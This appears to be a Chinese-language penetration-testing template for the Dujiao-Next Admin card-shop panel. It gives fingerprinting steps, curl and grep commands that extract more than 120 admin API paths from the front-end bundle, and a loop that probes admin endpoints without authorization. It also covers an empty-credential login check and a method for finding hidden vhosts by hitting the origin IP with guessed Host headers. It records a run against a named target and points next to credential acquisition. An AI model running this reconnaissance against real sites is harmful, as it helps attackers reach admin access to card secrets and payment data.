# Dujiao-Next Admin 后台指纹与 /api/v1/admin/** 管理 API 全清单提取（含未授权定性探测）

- **code**: dujiao-next-admin-后台指纹与-api-v1-admin-管理-api-全清单提取-含未授权定性探测
- **kind**: template
- **category**: info-leak
- **component**: Dujiao-Next Admin (dujiao-next, Go+Vue3)
- **language**: bash
- **source**: manual
- **verified**: 1
- **verified_note**: 在靶标 huomatiaozhuangmm-com 的资产 203.0.113.116 上实拍确认：`curl -k --noproxy '*' -H "Host: zl" https://203.0.113.116/` → 646 字节 SPA 外壳，标题 `Dujiao-Next Admin`，引用 `/assets/index-B4GaRbZl.js`；抓取该 bundle（310,680 字节）后提取出 `/api/v1` base 与 120+ 条 `/admin/**` 接口（含 `/admin/card-secrets/export`、`/admin/api-credentials`、`/admin/site-connections`）；对 10 个管理接口做未授权 GET，**10/10 返回 `{"status_code":401,"msg":"缺少 Authorization header"}`**，`POST /api/v1/admin/login` 空凭据返回 `{"status_code":400,"msg":"Username: 不能为空; Password: 不能为空"}`；同批路径在 Host: example.com / admin.pgid.club / pgid.club 下全部 404，证实该后台只绑在未公开的短名 vhost 上。证据文件：runs/djn-api-probe.txt、runs/djn-646.html、runs/djn-assets.js。对应 vuln_id=32。
- **path**: pocs/dujiao-next-admin-后台指纹与-api-v1-admin-管理-api-全清单提取-含未授权定性探测/dujiao-next-admin-api-enum.md
- **tags**: dujiao-next,独角数卡NEXT,发卡网,后台,API枚举,未授权,Vue3,源站直连
- **created_at**: 2026-10-02T14:28:28.202Z

## 描述

Dujiao-Next（独角数卡 NEXT，Go+Vue3）管理后台的识别指纹、从 Vue3 bundle 无登录提取 120+ 条 /api/v1/admin/** 管理 API 的方法、未授权定性探测脚本与判定口径（401 缺少 Authorization header = 鉴权严格），含"后台绑在未公开 vhost 上须靠源站 Host 枚举发现"这一关键前提。

## 用法

```
1) 先用指纹判定是否是 Dujiao-Next Admin（646B SPA 外壳 + 标题 Dujiao-Next Admin + /assets/index-<hash>.js）；
2) 抓主 bundle 用 grep 提 `/api/v1/admin/**` 全清单；
3) 对 authz/me 等接口做无 Authorization 的只读探测，用 body 里的 status_code 判定鉴权口径；
4) 若目标后台绑定在未公开 vhost 上，需先用源站 IP + Host 头枚举（curl --noproxy '*' -H "Host: <候选>" https://<ORIGIN_IP>/）找出承载它的 Host。
```

## 正文

```
## 背景
`Dujiao-Next`（独角数卡 NEXT）是 Go + Vue3 全栈的新一代发卡系统，与 PHP 的 dujiaoka 完全不是一套代码。其管理端是一个独立部署的 **Vue3 SPA**（`<title>Dujiao-Next Admin</title>`，入口 `/assets/index-<hash>.js` + `vendor-vue-*.js` + `vendor-ui-*.js`，favicon `/dj.svg`），后端 API 前缀 **`/api/v1`**，管理接口统一在 `/api/v1/admin/**`。

## 识别指纹
- 页面 646 字节左右的 SPA 外壳，标题 `Dujiao-Next Admin`
- `<script type="module" crossorigin src="/assets/index-<hash>.js">`
- 状态码风格：HTTP 200 + body 内业务码（`{"status_code":401,"msg":"缺少 Authorization header","data":{"request_id":"<uuid>"}}`）

## 从 bundle 提取管理 API 全清单（无需登录，前端未混淆）
```bash
curl -s -k --noproxy '*' -H "Host: <ADMIN_VHOST>" -o djn-assets.js https://<ORIGIN_IP>/assets/index-<hash>.js
# 提取 API 路径
grep -oaE '["`'"'"'](/(api|admin|prod-api)[A-Za-z0-9_\-/{}.$]{0,70})["`'"'"']' djn-assets.js | sort -u
# 取 API base
grep -oaE '.{90}baseURL.{140}' djn-assets.js
```
典型命中（完整清单约 120+ 条，节选高危项）：
```
/api/v1/admin/login                          # 登录
/api/v1/admin/authz/me                       # 当前管理员身份（鉴权探测金标准）
/api/v1/admin/authz/admins | authz/roles | authz/policies | authz/audit-logs
/api/v1/admin/card-secrets                   # 卡密列表
/api/v1/admin/card-secrets/export            # ★ 卡密全量导出
/api/v1/admin/card-secrets/import | batch | batch-status | batches | template | stats
/api/v1/admin/orders | orders/${e}/fulfillment/download | orders/${e}/refund-to-wallet
/api/v1/admin/payments | payments/export
/api/v1/admin/products | products/batch-import | products/batch-delete
/api/v1/admin/api-credentials | api-credentials/${e}/approve | .../reject
/api/v1/admin/site-connections | site-connections/${e}/reset-secret
/api/v1/admin/channel-clients | channel-clients/${e}/reset-secret
/api/v1/admin/settings | settings/smtp | settings/smtp/test | settings/telegram-bot | settings/captcha
/api/v1/admin/affiliates/users | affiliates/withdraws/${e}/pay
/api/v1/admin/dashboard/overview | dashboard/trends | dashboard/rankings | dashboard/inventory-alerts
/api/v1/admin/gift-cards/generate | gift-cards/export
/api/v1/admin/media | banners | posts | coupons | promotions | member-levels
/api/v1/admin/procurement-orders | reconciliation/run | reconciliation/jobs
```

## 未授权探测方法（定性，不爆破）
```bash
for p in authz/me dashboard/overview settings authz/roles card-secrets orders products site-connections api-credentials; do
  curl -s -k --noproxy '*' -H "Host: <ADMIN_VHOST>" \
    -H "Accept: application/json" "https://<ORIGIN_IP>/api/v1/admin/$p" | head -c 300; echo
done
# 登录接口存在性（空凭据，勿做口令尝试）：
curl -s -k --noproxy '*' -H "Host: <ADMIN_VHOST>" -H "Content-Type: application/json" \
  -X POST -d '{"username":"","password":""}' "https://<ORIGIN_IP>/api/v1/admin/login"
```

## 判定口径
- `{"status_code":401,"msg":"缺少 Authorization header"}` → **鉴权严格（Bearer Token），无未授权访问**；后续方向是凭据获取（`/api/v1/admin/login`）或 Go 后端组件自身的公开漏洞。
- 若任一接口在无 Authorization 情况下返回业务数据 → **直接是管理员权限级别的未授权访问**（可读卡密/订单/支付配置）。

## 踩坑
1. 该后台常绑定在**未公开的 vhost** 上（本项目实例用短名 `Host: zl` 命中），**不在证书透明/FOFA 收录的子域清单里** —— 必须靠"源站 IP + Host 头枚举"才可能发现，直接按公开子域清单扫会全部 404。
2. 直连源站时必须禁用本机代理（curl `--noproxy '*'`），否则响应头会混入前置 CDN 的 `CF-RAY`，导致"是否命中源站"的判定失真。
3. 业务码 401 走 HTTP 200 状态行返回，只看 HTTP 状态码会全部误判为"存在且可达"。
```
